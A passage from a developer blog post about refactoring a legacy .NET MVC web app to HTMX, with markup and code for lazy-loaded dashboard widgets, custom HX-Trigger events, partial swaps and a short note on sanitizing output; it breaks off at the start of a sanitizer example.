class=\"na\">role=</span><span class=\"s\">\"content\"</span><span class=\"nt\">&gt;</span> <span class=\"nt\">&lt;div</span> <span class=\"na\">class=</span><span class=\"s\">\"widget-body no-padding\"</span> <span class=\"na\">id=</span><span class=\"s\">\"ActiveLeads\"</span><span class=\"nt\">&gt;</span> <span class=\"nt\">&lt;div</span> <span class=\"na\">id=</span><span class=\"s\">\"LeadsWrapper\"</span> <span class=\"na\">class=</span><span class=\"s\">\"form-inline no-footer\"</span><span class=\"nt\">&gt;</span> <span class=\"nt\">&lt;table</span> <span class=\"na\">class=</span><span class=\"s\">\"table no-footer\"</span> <span class=\"na\">id=</span><span class=\"s\">\"AciveLeads\"</span> <span class=\"na\">role=</span><span class=\"s\">\"grid\"</span> <span class=\"na\">aria-describedby=</span><span class=\"s\">\"ActiveLeads_info\"</span><span class=\"nt\">&gt;</span> <span class=\"nt\">&lt;thead&gt;</span> <span class=\"nt\">&lt;tr</span> <span class=\"na\">role=</span><span class=\"s\">\"row\"</span><span class=\"nt\">&gt;</span> <span class=\"nt\">&lt;th</span> <span class=\"na\">rowspan=</span><span class=\"s\">\"1\"</span> <span class=\"na\">colspan=</span><span class=\"s\">\"1\"</span><span class=\"nt\">&gt;</span>Event<span class=\"nt\">&lt;/th&gt;</span> <span class=\"nt\">&lt;th</span> <span class=\"na\">class=</span><span class=\"s\">\"sorting_disabled\"</span> <span class=\"na\">rowspan=</span><span class=\"s\">\"1\"</span> <span class=\"na\">colspan=</span><span class=\"s\">\"1\"</span><span class=\"nt\">&gt;</span>\"Fee\"<span class=\"nt\">&lt;/th&gt;</span> <span class=\"nt\">&lt;th</span> <span class=\"na\">class=</span><span class=\"s\">\"sorting_disabled\"</span> <span class=\"na\">rowspan=</span><span class=\"s\">\"1\"</span> <span class=\"na\">colspan=</span><span class=\"s\">\"1\"</span><span class=\"nt\">&gt;&lt;/th&gt;</span> <span class=\"nt\">&lt;/tr&gt;</span> <span class=\"nt\">&lt;/thead&gt;</span> <span class=\"nt\">&lt;tbody&gt;</span> <span class=\"nt\">&lt;tr</span> <span class=\"na\">class=</span><span class=\"s\">\"odd\"</span><span class=\"nt\">&gt;&lt;td</span> <span class=\"na\">valign=</span><span class=\"s\">\"top\"</span> <span class=\"na\">colspan=</span><span class=\"s\">\"3\"</span><span class=\"nt\">&gt;</span>Loading<span class=\"nt\">&lt;/td&gt;&lt;/tr&gt;</span> <span class=\"nt\">&lt;/tbody&gt;</span> <span class=\"nt\">&lt;/table&gt;</span> <span class=\"nt\">&lt;div</span> <span class=\"na\">class=</span><span class=\"s\">\"dt-toolbar-footer\"</span><span class=\"nt\">&gt;</span> <span class=\"nt\">&lt;span</span> <span class=\"na\">class=</span><span class=\"s\">\"text-danger\"</span><span class=\"nt\">&gt;</span>Loading...<span class=\"nt\">&lt;/span&gt;</span> <span class=\"nt\">&lt;/div&gt;</span> <span class=\"nt\">&lt;/div&gt;</span> <span class=\"nt\">&lt;/div&gt;</span> <span class=\"nt\">&lt;/div&gt;</span> <span class=\"nt\">&lt;/div&gt;</span> </code></pre></div></div> <p>I’ve already overlaid my loading style on the <code class=\"language-plaintext highlighter-rouge\">div</code> with id <code class=\"language-plaintext highlighter-rouge\">ActiveLeads</code> but we need to fetch this data. If this were a component in a framework, we would hydrate this component using the component lifecycle events (or any of the myriad other component approaches that have come and gone). In the library-driven ajax approach, we might do something like this.</p> <div class=\"language-javascript highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"nb\">document</span><span class=\"p\">).</span><span class=\"nx\">ready</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span> <span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">#LeadsWidgetContainerDiv</span><span class=\"dl\">'</span><span class=\"p\">).</span><span class=\"nx\">load</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">/Lead/Active</span><span class=\"dl\">'</span><span class=\"p\">);</span> <span class=\"p\">});</span> </code></pre></div></div> <p>But part of the mental shift that comes with walking away from the direct DOM manipulation approach is to think first about hypermedia controls. We also want improved Locality of Behavior. This component will have a refresh button as an affordance for the user to independently refresh the content of this widget. This is our hypermedia control. This is our hypermedia control that responds to click events, but HTMX allows us to define a much richer set of interactive possibilities within our markup.</p> <div class=\"language-html highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>... <span class=\"nt\">&lt;h2&gt;</span>Active Leads<span class=\"nt\">&lt;/h2&gt;</span> <span class=\"nt\">&lt;div</span> <span class=\"na\">class=</span><span class=\"s\">\"widget-toolbar\"</span> <span class=\"na\">role=</span><span class=\"s\">\"menu\"</span><span class=\"nt\">&gt;</span> <span class=\"nt\">&lt;a</span> <span class=\"na\">href=</span><span class=\"s\">\"/Lead/Active\"</span> <span class=\"na\">id=</span><span class=\"s\">\"ActiveLeadsReloadButton\"</span> <span class=\"na\">class=</span><span class=\"s\">\"button-icon htmx-refresh-btn txt-color-white\"</span> <span class=\"na\">hx-get=</span><span class=\"s\">\"/Lead/Active\"</span> <span class=\"na\">hx-trigger=</span><span class=\"s\">\"click, revealed\"</span><span class=\"nt\">&gt;</span> <span class=\"nt\">&lt;i</span> <span class=\"na\">class=</span><span class=\"s\">\"fa fa-refresh\"</span><span class=\"nt\">&gt;&lt;/i&gt;</span> <span class=\"nt\">&lt;/a&gt;</span> <span class=\"nt\">&lt;/div&gt;</span> ... </code></pre></div></div> <p>Out of the box, an anchor will make a new full-page request based on the <code class=\"language-plaintext highlighter-rouge\">href</code> property of the tag, however we’re overriding the behavior of this element with HTMX. It is now an ajax control (assuming HTMX is loaded) but keeping the <code class=\"language-plaintext highlighter-rouge\">href</code> attribute allows this element to work without JavaScript (assuming the backend will return just the component/partial for HTMX requests and a full page, inheriting the app _layout if not). I’m specifying multiple events (separated by commas) for this control. <em>(notably, as of v1.9.10 there is a bug in the library that only scans for exact matches on the <code class=\"language-plaintext highlighter-rouge\">revealed</code>. I might be able to instead use the <code class=\"language-plaintext highlighter-rouge\">intersect</code> but a <a href=\"https://github.com/bigskysoftware/htmx/pull/2237\">pull-request for this issue</a> was submitted a week ago and the fix was a single character change.)</em></p> <p>Our financial summary swapped the innerHTML of the control/div with the response. This is the default behavior. In this case, it doesn’t make much sense to place the response in the body of that anchor tag, so we need to tell HTMX where to target the response. We use the <code class=\"language-plaintext highlighter-rouge\">hx-target</code> attribute with a standard css selector.</p> <div class=\"language-html highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>... <span class=\"nt\">&lt;a</span> <span class=\"na\">href=</span><span class=\"s\">\"/Lead/Active\"</span> <span class=\"na\">id=</span><span class=\"s\">\"ActiveLeadsReloadButton\"</span> <span class=\"na\">class=</span><span class=\"s\">\"button-icon htmx-refresh-btn txt-color-white\"</span> <span class=\"na\">hx-get=</span><span class=\"s\">\"/Lead/Active\"</span> <span class=\"na\">hx-trigger=</span><span class=\"s\">\"click, revealed\"</span> <span class=\"na\">hx-target=</span><span class=\"s\">\"#ActiveLeads\"</span><span class=\"nt\">&gt;</span> <span class=\"nt\">&lt;i</span> <span class=\"na\">class=</span><span class=\"s\">\"fa fa-refresh\"</span><span class=\"nt\">&gt;&lt;/i&gt;</span> <span class=\"nt\">&lt;/a&gt;</span> ... </code></pre></div></div> <p>This is also a useful approach as the <code class=\"language-plaintext highlighter-rouge\">hx-target</code> attribute is inherited by children, so if you use <code class=\"language-plaintext highlighter-rouge\">hx-boost</code> at the top level of the body, you might get unexpected results without manually overriding boosted links to include <code class=\"language-plaintext highlighter-rouge\">hx-target=\"body\"</code>.</p> <p>Initially the skeleton will render with the loading overlay, but the user receives no subsequent feedback when the component is refreshed. HTMX allows us to specify a loading indicator. The class <code class=\"language-plaintext highlighter-rouge\">.htmx-indicator</code> is provided for us, which defaults to transparent but HTMX will apply additional classes during the request rendering the element visible. A spinner/throbber is perfect for this. In the widget menu section, I’ll add an element to act as our indicator.</p> <div class=\"language-html highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>... <span class=\"nt\">&lt;span</span> <span class=\"na\">class=</span><span class=\"s\">\"widget-loader htmx-indicator\"</span> <span class=\"na\">id=</span><span class=\"s\">\"LeadsLoading\"</span><span class=\"nt\">&gt;</span> <span class=\"nt\">&lt;i</span> <span class=\"na\">class=</span><span class=\"s\">\"fa fa-refresh fa-spin\"</span><span class=\"nt\">&gt;&lt;/i&gt;</span> <span class=\"nt\">&lt;/span&gt;</span> ... </code></pre></div></div> <p>And I just need to specify that I want to use this indicator in the HTML using the <code class=\"language-plaintext highlighter-rouge\">hx-indicator</code> property.</p> <div class=\"language-html highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>... <span class=\"nt\">&lt;a</span> <span class=\"na\">id=</span><span class=\"s\">\"ActiveLeadsReloadButton\"</span> <span class=\"na\">class=</span><span class=\"s\">\"button-icon htmx-refresh-btn txt-color-white\"</span> <span class=\"na\">hx-get=</span><span class=\"s\">\"/Lead/Active\"</span> <span class=\"na\">hx-target=</span><span class=\"s\">\"#ActiveLeads\"</span> <span class=\"na\">hx-indicator=</span><span class=\"s\">\"#LeadsLoading\"</span><span class=\"nt\">&gt;</span> <span class=\"nt\">&lt;i</span> <span class=\"na\">class=</span><span class=\"s\">\"fa fa-refresh\"</span><span class=\"nt\">&gt;&lt;/i&gt;</span> <span class=\"nt\">&lt;/a&gt;</span> ... </code></pre></div></div> <p>Clicking the refresh button gives the user subtle, but useful feedback on the state of the component. Coming from a direct DOM manipulation mindset or a responsive mindset, it’s both strange yet freeing to step away from the imperative mindset of toggling classes or manually injecting markup into the page. Since this app has historically used jQuery, my mental default was to manually toggle classes. At first, it was it was difficult to let go of this type of approach. It can be hard to relinquish this much control as a developer. Many times in this process I had to stop myself and think “what is the pure hypermedia way to accomplish this?” As I have steadily improved my application’s UX while (so far) only deleting code, I can tell you it’s a good feeling! I can focus more and more on delivering value to my customers without getting bogged down in the implementation details. It’s worth pointing out the goal isn’t to eliminate all JavaScript, but rather use it in a much more deliberate and thoughtful way. I can bring in a service worker, client libraries, or even component frameworks (or use HTMX’s built-in client-side templating) where it makes sense. I simply have a power powerful default/starting place that I can extend with a much more meaningful set of options where appropriate.</p> <p>Now that I have completed this process for every widget in the dashboard the server is able to generate the skeleton dashboard html page much faster. With the exception of the calendar (which is always at the top of the page) all of our dashlets are now lazy loading when they are visible in the viewport. Our dashboard doesn’t contain any meaningful state, so we may now apply a cache policy on this resource with a long expiration. Navigating to the dashboard from anywhere in the app gives us a time-to-interactive of 187ms with a mere 34.3kb total network transfer on the request.</p> <p>The main bottlenecks (pausing document parsing to retrieve and load core scripts and css) are skipped. Our parse-to-paint timeline on boosted interactions now looks like this:</p> <table> <thead> <tr> <th>Action</th> <th>Time</th> </tr> </thead> <tbody> <tr> <td>Fetch Dashboard HTML</td> <td>&lt;1ms from cache</td> </tr> <tr> <td>Parse HTML</td> <td>1ms</td> </tr> <tr> <td>Parse Scripts</td> <td>13ms</td> </tr> <tr> <td>Render</td> <td>22 ms</td> </tr> <tr> <td>Paint</td> <td>4ms</td> </tr> </tbody> </table> <p>The time from initial request to first meaningful paint on a boosted dashboard page load is now 360ms. This is down from multiple seconds using the Web 1.0 approach, all accomplished without writing a single line of JavaScript (in fact, several dozen lines of js have been deleted so far). We’re just extending what HTML and the REST architectural style already gives us. The performance and responsiveness of this app is only going to continue to improve as we continue to leverage the power this library offers.</p> <h2 id=\"trigger-modifiers\">Trigger Modifiers</h2> <p>On the top of the page is a “recently viewed” menu. Since a user only really cares about the contents of this menu when they’re actually looking at it, rather than asynchrously loading this menu when the page renders, it makes sense to request the body of this menu when it is expanded. Based on what we’ve done so far, this will be easy:</p> <div class=\"language-html highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>... <span class=\"nt\">&lt;div</span> <span class=\"na\">class=</span><span class=\"s\">\"context hidden-xs\"</span> <span class=\"na\">id=</span><span class=\"s\">\"RecentDropdown\"</span><span class=\"nt\">&gt;</span> <span class=\"nt\">&lt;span</span> <span class=\"na\">class=</span><span class=\"s\">\"project-selector dropdown-toggle\"</span> <span class=\"na\">data-toggle=</span><span class=\"s\">\"dropdown\"</span> <span class=\"na\">hx-get=</span><span class=\"s\">\"/Home/RecentlyViewed\"</span> <span class=\"na\">hx-target=</span><span class=\"s\">\"#RecentItems\"</span> <span class=\"na\">hx-trigger=</span><span class=\"s\">\"click\"</span> <span class=\"na\">hx-swap=</span><span class=\"s\">\"outerHTML\"</span><span class=\"nt\">&gt;</span> Recently Viewed:<span class=\"nt\">&lt;i</span> <span class=\"na\">class=</span><span class=\"s\">\"fa fa-angle-down\"</span><span class=\"nt\">&gt;&lt;/i&gt;</span> <span class=\"nt\">&lt;/span&gt;</span> <span class=\"nt\">&lt;ul</span> <span class=\"na\">class=</span><span class=\"s\">\"dropdown-menu\"</span> <span class=\"na\">id=</span><span class=\"s\">\"RecentItems\"</span><span class=\"nt\">&gt;</span> <span class=\"nt\">&lt;i</span> <span class=\"na\">class=</span><span class=\"s\">\"fa fa-refresh fa-spin\"</span><span class=\"nt\">&gt;&lt;/i&gt;</span> loading... <span class=\"nt\">&lt;/ul&gt;</span> <span class=\"nt\">&lt;/div&gt;</span> ... </code></pre></div></div> <p><img src=\"/assets/images/recently-viewed.png\" alt=\"recently viewed menu\" /></p> <p>The span becomes our hypermedia control, and clicking this element will both expand the dropdown and load its contents. In this case, we want our click to behave differently. Unlike the dashboard widgets, once this menu is loaded the first time, there is no really need to refresh it on a subsequent click. We want to modify this event to only fire <code class=\"language-plaintext highlighter-rouge\">once</code>. Our trigger will look like this <code class=\"language-plaintext highlighter-rouge\">hx-trigger=\"click once\"</code>. Since there is no comma after the trigger event, what follows is a modifier. This is also useful for form submissions where we want to guard against double-submission.</p> <h2 id=\"custom-events--reactive-components\">Custom Events &amp; Reactive Components</h2> <p>On the dashboard, events that are currently on the performer’s radar are separated into two categories, Leads and Gigs. <em>Leads</em> are events the performer is in an active sales process. They have not been booked yet. <em>Gigs</em>, on the other hand, are confirmed events the performer is committed to appear and perform at.</p> <p>On the leads dashlet, each pending event has a kebab menu and one of the available options is to convert the lead into a gig. Selecting this option triggers a <code class=\"language-plaintext highlighter-rouge\">POST</code> operation in a hypermedia 1.0 <code class=\"language-plaintext highlighter-rouge\">&lt;form&gt;</code> resulting in the entire dashboard being returned in the response. Because this application is boosted, the form post will also be boosted and the entire request will take less than half a second. That said, every dashlet will then need to be reloaded. All we really need to do is remove one <code class=\"language-plaintext highlighter-rouge\">&lt;tr&gt;</code> from the leads dashlet and add one <code class=\"language-plaintext highlighter-rouge\">&lt;tr&gt;</code> to the gigs dashlet. We don’t need to re-request the calendar, the task list, the current automation queue, etc. Ideally we want an experience similar to what is offered in the mainstream frameworks, where state changes and any elements dependent on that state will automatically react to that change.</p> <p>We could take the SPA approach and use some kind of state management library to produce a local copy of state with a complex framework to keep the DOM in sync as a reflection of that state as well as more complexity and lurking edge cases to keep the local state in sync with the actual source of truth (the database on the server). In the case of this application, it makes much more sense to eliminate all of that complexity entirely (as well as close to year of rewrites). The trade-off is an almost imperceptible performance penalty that is not significant in the context of this application and a guarantee that what is on the screen is a true representation of state at all times.</p> <p>The first thing I want to do is redefine the menu option currently controls this behavior to be another hypermedia control. This control should perform a <code class=\"language-plaintext highlighter-rouge\">POST</code> based on the currently defined implementation (although if I were building this application from scratch to be a native hypermedia system, I probably would define this to be a RESTful <code class=\"language-plaintext highlighter-rouge\">PATCH</code> operation, but since the legacy app uses an RPC-style approach for the UI, we’ll reuse what we have). HTMX supports the full set of HTTP operations, which affords great power to webdev (in contrast, HTML natively only supports <code class=\"language-plaintext highlighter-rouge\">GET</code> and <code class=\"language-plaintext highlighter-rouge\">POST</code>). The element would look like this:</p> <div class=\"language-html highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>... <span class=\"nt\">&lt;li&gt;</span> <span class=\"nt\">&lt;span</span> <span class=\"na\">class=</span><span class=\"s\">\"bookGig\"</span> <span class=\"na\">hx-post=</span><span class=\"s\">\"/Gig/Book/{Lead.Id}\"</span> <span class=\"na\">hx-indicator=</span><span class=\"s\">\"#LeadsLoading\"</span> <span class=\"na\">hx-target=</span><span class=\"s\">\"#ActiveLeadsTable\"</span> <span class=\"nt\">&gt;</span> <span class=\"nt\">&lt;i</span> <span class=\"na\">class=</span><span class=\"s\">\"fa fa-calendar-check-o\"</span><span class=\"nt\">&gt;&lt;/i&gt;</span> Convert To Gig <span class=\"nt\">&lt;/span&gt;</span> <span class=\"nt\">&lt;/li&gt;</span> ... </code></pre></div></div> <p>For updating the leads dashlet, there are a couple of interesting options. Naturally I could refactor this endpoint to return a new copy of the component and target the body of the widget. HTMX, however, gives us a great deal of control over the target. If I wanted to be more surgical, I could refactor this endpoint to return an empty response and target the <code class=\"language-plaintext highlighter-rouge\">tr</code> closest to the convert button. My target would be <code class=\"language-plaintext highlighter-rouge\">hx-target=\"closest tr\"</code>. This is a useful trick to keep in your back pocket, but this app uses DataTables, a javascript-driven table component that isn’t observing the underlying table and thus would need to be informed of the change. My instinct is to take the simple approach of refreshing the entire widget body, but it can be useful to know how to listen for HTMX events in javascript so I will show my implementation, then explain listening for htmx events in JavaScript.</p> <p>I’m going to keep my hypermedia control as implemented above. The problem is, since this lead will be moving to the Gigs dashlet, I also need to refresh this. Following the HTMX way of defining this behavior declaratively rather than imperitively, I want to broadcast an event the Gigs dashlet can trigger on. This will be a custom event that I will be defining in the response headers using the <code class=\"language-plaintext highlighter-rouge\">Hx-Trigger</code> <a href=\"https://htmx.org/headers/hx-trigger/\">header</a>.</p> <p>My backend controller method looks like this:</p> <div class=\"language-csharp highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">public</span> <span class=\"n\">ActionResult</span> <span class=\"nf\">Book</span><span class=\"p\">(</span><span class=\"n\">Guid</span> <span class=\"n\">id</span><span class=\"p\">)</span> <span class=\"p\">{</span> <span class=\"kt\">var</span> <span class=\"n\">currentGig</span> <span class=\"p\">=</span> <span class=\"n\">LeadService</span><span class=\"p\">.</span><span class=\"nf\">UpdateStatus</span><span class=\"p\">(</span><span class=\"n\">Gig</span><span class=\"p\">.</span><span class=\"n\">StatusBooked</span><span class=\"p\">);</span> <span class=\"n\">Request</span><span class=\"p\">.</span><span class=\"n\">RequestContext</span><span class=\"p\">.</span><span class=\"n\">HttpContext</span><span class=\"p\">.</span><span class=\"n\">Response</span><span class=\"p\">.</span><span class=\"nf\">AddHeader</span><span class=\"p\">(</span><span class=\"s\">\"Hx-Trigger\"</span><span class=\"p\">,</span> <span class=\"s\">\"GigsUpdated\"</span><span class=\"p\">);</span> <span class=\"k\">return</span> <span class=\"nf\">Active</span><span class=\"p\">();</span> <span class=\"p\">}</span> </code></pre></div></div> <p><img src=\"/assets/images/event-header.png\" alt=\"Response headers for this request showing a Hx-Trigger: gigsUpdated header\" /></p> <p>I can now update my Gigs dashlet load/refresh button to trigger on <code class=\"language-plaintext highlighter-rouge\">revealed</code>, <code class=\"language-plaintext highlighter-rouge\">click</code>, <em>and</em> <code class=\"language-plaintext highlighter-rouge\">gigsUpdated</code> (which will bubble up the DOM so I’m specifing to listen to my custom event <code class=\"language-plaintext highlighter-rouge\">from:body</code>):</p> <div class=\"language-html highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>... <span class=\"nt\">&lt;a</span> <span class=\"na\">href=</span><span class=\"s\">\"/Gig/Upcoming\"</span> <span class=\"na\">id=</span><span class=\"s\">\"UpcomingGigsReloadButton\"</span> <span class=\"na\">class=</span><span class=\"s\">\"button-icon htmx-refresh-btn txt-color-white\"</span> <span class=\"na\">hx-get=</span><span class=\"s\">\"/Gig/Upcoming\"</span> <span class=\"na\">hx-target=</span><span class=\"s\">\"#ActiveGigs\"</span> <span class=\"na\">hx-indicator=</span><span class=\"s\">\"#GigsLoading\"</span> <span class=\"na\">hx-trigger=</span><span class=\"s\">\"revealed, click, gigsUpdated from:body\"</span><span class=\"nt\">&gt;</span> <span class=\"nt\">&lt;i</span> <span class=\"na\">class=</span><span class=\"s\">\"fa fa-refresh\"</span><span class=\"nt\">&gt;&lt;/i&gt;</span> <span class=\"nt\">&lt;/a&gt;</span> ... </code></pre></div></div> <p>I <em>want</em> my components to be reactive to state changes. The difference here is, the source of truth is the server, so rather than duplicating state on the client and creating components that observe that non-authorative state, my components react to events that bubble up as a result of state changes at the source of truth. This is a pattern I will be using all over the application, broadcasting certain state-change events that any components on the page might be interested in. For example, Leads, Gigs, and Tasks can be created from a modal but this model can appear on any page in the app. Rather than relying on callbacks to hunt around and script reload clicks and complex logic to find and optionally reload widgets, any interested widgets that should respond can simply listen for response events keeping everything nice and declarative.</p> <p>At this point, it occurs to me that these state changes have a side-effect of changing the state of the calendar. New Leads/Gigs should appear, and converted gigs/leads should appear a different color. I certainly could instruct the calendar component to listen to these custom events, but that would require rebuilding the entire calendar (which is drawn by the javascript component fullCalendar). This might be a good candidate for a js listener to listen to these events and update the calendar accordingly. HTMX events are prefixed with <code class=\"language-plaintext highlighter-rouge\">htmx:</code> but custom events are not. The code to listen for my custom events and refresh the calendar would look like this:</p> <div class=\"language-javascript highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">body</span><span class=\"p\">.</span><span class=\"nx\">addEventListener</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">gigsUpdated</span><span class=\"dl\">'</span><span class=\"p\">,</span> <span class=\"kd\">function</span> <span class=\"p\">(</span><span class=\"nx\">evt</span><span class=\"p\">)</span> <span class=\"p\">{</span> <span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">#calendar</span><span class=\"dl\">'</span><span class=\"p\">).</span><span class=\"nx\">fullCalendar</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">refetchEvents</span><span class=\"dl\">'</span><span class=\"p\">);</span> <span class=\"p\">});</span> <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">body</span><span class=\"p\">.</span><span class=\"nx\">addEventListener</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">leadsUpdated</span><span class=\"dl\">'</span><span class=\"p\">,</span> <span class=\"kd\">function</span> <span class=\"p\">(</span><span class=\"nx\">evt</span><span class=\"p\">)</span> <span class=\"p\">{</span> <span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">#calendar</span><span class=\"dl\">'</span><span class=\"p\">).</span><span class=\"nx\">fullCalendar</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">refetchEvents</span><span class=\"dl\">'</span><span class=\"p\">);</span> <span class=\"p\">});</span> </code></pre></div></div> <p>It’s important to remember that the <code class=\"language-plaintext highlighter-rouge\">HX-Trigger</code> header is only processed on HTMX requests. If you (like I) have legacy ajax forms and modals that aren’t driven by HTMX, your events won’t be picked up by your HTMX components. For legacy ajax components, it was necessary to trigger events using the HTMX api. The basic pattern looks like this:</p> <div class=\"language-javascript highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"kd\">function</span> <span class=\"nx\">checkHXTrigger</span><span class=\"p\">(</span><span class=\"nx\">url</span><span class=\"p\">,</span> <span class=\"nx\">method</span><span class=\"p\">)</span> <span class=\"p\">{</span> <span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">ajax</span><span class=\"p\">({</span> <span class=\"na\">url</span><span class=\"p\">:</span> <span class=\"nx\">url</span><span class=\"p\">,</span> <span class=\"na\">type</span><span class=\"p\">:</span> <span class=\"nx\">method</span><span class=\"p\">,</span> <span class=\"c1\">// 'POST' or 'GET'</span> <span class=\"na\">complete</span><span class=\"p\">:</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">xhr</span><span class=\"p\">)</span> <span class=\"p\">{</span> <span class=\"kd\">var</span> <span class=\"nx\">headerValue</span> <span class=\"o\">=</span> <span class=\"nx\">xhr</span><span class=\"p\">.</span><span class=\"nx\">getResponseHeader</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">HX-Trigger</span><span class=\"dl\">'</span><span class=\"p\">);</span> <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">headerValue</span><span class=\"p\">)</span> <span class=\"p\">{</span> <span class=\"nx\">htmx</span><span class=\"p\">.</span><span class=\"nx\">trigger</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">body</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"nx\">headerValue</span><span class=\"p\">);</span> <span class=\"p\">}</span> <span class=\"p\">}</span> <span class=\"p\">});</span> <span class=\"p\">}</span> </code></pre></div></div> <p>While experimenting with custom events, I found the <a href=\"https://htmx.org/docs/#debugging\">built-in logging and debugging capabilities</a> useful, particularly <code class=\"language-plaintext highlighter-rouge\">htmx.logAll()</code> and <code class=\"language-plaintext highlighter-rouge\">monitorEvents(htmx.find(\"#theElement\"));</code>.</p> <h2 id=\"partial-swaps-and-pushing-history\">Partial Swaps and Pushing History</h2> <p>Most of the components we’ve talked about are little standalone resources that only exist as partials (in .net parliance). Let’s look at an exception; the record detail and edit screens. Here is the contact details page in Mago:</p> <p><img src=\"/assets/images/contact-details.png\" alt=\"Contact details screen in Mago\" /></p> <p>When this page, the dashlets are asynchrously lazy-loaded but clicking the edit icon will load a substantially identical page (including dashlets) but the contact card is replaced with a form. The edit icon is currently a hypermedia 1.0 hyperlink that reloads the entire page and its contents. HTMX will allow us to replace just the contact card dashlet with the edit form.</p> <p>The problem is, unlike the dashboard dashlets, the edit page is not a partial, it is a full page. Now, I could maintain two copies of this component (the partial, and the full page) and serve one or the other based on different routes or content-negotiation. Even though I’m not totally married to DRY, I don’t relish the idea of maintaining two copies of the same view. I could refactor the edit form to be a partial, but there is still a need to navigate directly to the edit screen (either via hyperlink or browser history). Really I would like to keep only one template, but only inject the relevant part into the dashlet. <code class=\"language-plaintext highlighter-rouge\">hx-select</code> is the solution.</p> <p>Hx-select allows me to specify specific content to be swapped. This is what my edit icon looks like:</p> <div class=\"language-html highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>... <span class=\"nt\">&lt;a</span> <span class=\"na\">href=</span><span class=\"s\">\"/Contact/Edit/{contact.id}\"</span> <span class=\"na\">class=</span><span class=\"s\">\"button-icon btn btn-xs\"</span> <span class=\"na\">hx-get=</span><span class=\"s\">\"/Contact/Edit/{contact.id}\"</span> <span class=\"na\">hx-target=</span><span class=\"s\">\"#ContactWidget\"</span> <span class=\"na\">hx-select=</span><span class=\"s\">\"#ContactWidget\"</span> <span class=\"na\">hx-swap=</span><span class=\"s\">\"outerHTML\"</span> <span class=\"na\">hx-indicator=</span><span class=\"s\">\"#ContactLoadingIndicator\"</span> <span class=\"na\">hx-push-url=</span><span class=\"s\">\"true\"</span><span class=\"nt\">&gt;</span> <span class=\"nt\">&lt;i</span> <span class=\"na\">class=</span><span class=\"s\">\"fa fa-pencil\"</span><span class=\"nt\">&gt;&lt;/i&gt;</span> <span class=\"nt\">&lt;/a&gt;</span> ... </code></pre></div></div> <p>Let’s break down what’s happening here:</p> <ul> <li><code class=\"language-plaintext highlighter-rouge\">href</code> - default behavior. No js means the normal hypermedia 1.0 navigation will happen on click</li> <li><code class=\"language-plaintext highlighter-rouge\">hx-get</code> - this is defining that we’re doing an HTMX driven interactions, overriding the default link behavior</li> <li><code class=\"language-plaintext highlighter-rouge\">hx-target</code> - target the dashlet container element</li> <li><code class=\"language-plaintext highlighter-rouge\">hx-select</code> - instructing HTMX to parse out just the fragment of the response we want to swap</li> <li><code class=\"language-plaintext highlighter-rouge\">hx-swap</code> - we want to include the containing element in the swap</li> <li><code class=\"language-plaintext highlighter-rouge\">hx-indicator</code> - let the user know <em>something</em> is happening during loading</li> <li><code class=\"language-plaintext highlighter-rouge\">hx-push-url</code> - by default, these types of events don’t appear in the history, but in this case, I want the full edit URL to be pushed into the browser history so the back button will work properly.</li> </ul> <p>Clicking this link will leave all other elements in place, again providing that responsive UX. There is no need to reload those dashlets over and over again. On the edit form, the submit is an HTMX post with similar targeting and swap properties and will, again, push the URL into the brower history. Likewise the cancel button is identical to the above fragment other than the <code class=\"language-plaintext highlighter-rouge\">hx-get</code> property.</p> <p>This approach trades a little bit of network overhead (a couple of kilobytes) for the simplicity of not maintaining multiple copies of the same form and/or maintaining different routes, or controller if statements and razor <code class=\"language-plaintext highlighter-rouge\">@renderpartial()</code> statements. Long term I may refactor to the split the view in to parts and add some conditional logic in the controller that will serve the full page or partial depending on HTMX request headers, but this reduces the scope of my change and associated risk while increasing time-to-value for my customers. It’s a useful trick to keep up your sleeve.</p> <h2 id=\"security-considerations\">Security Considerations</h2> <p>In many ways, the mainstream framework approach to web development has kept the actual HTML so abstracted away, it can cause complacency. With HTMX, you’re working much closer to the html, response are injected directly into DOM and all scripts go through <code class=\"language-plaintext highlighter-rouge\">eval()</code>. Sending down unsanitized user input has always–and will always–be a bad idea. It is important to adopt the best practices of the past to sanitize responses. In most cases you, like I, will be using some kind of backend framework. Mago is built using .net MVC. which has always handled output sanitization at the framework level. There are, however, a few places wher I want to send raw HTML in the template response (e.g. html emails in the history component). In this case, the onus is on me to sanitize this before rendering it in the templates. My application has always had an html sanitizer dependency because this potential vulnerability has always existed and is not unique to HTMX. My history view implements the sanitizer like this:</p> <div class=\"language-html highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>... @if (item.HistoryType == HistoryType.Email) { var 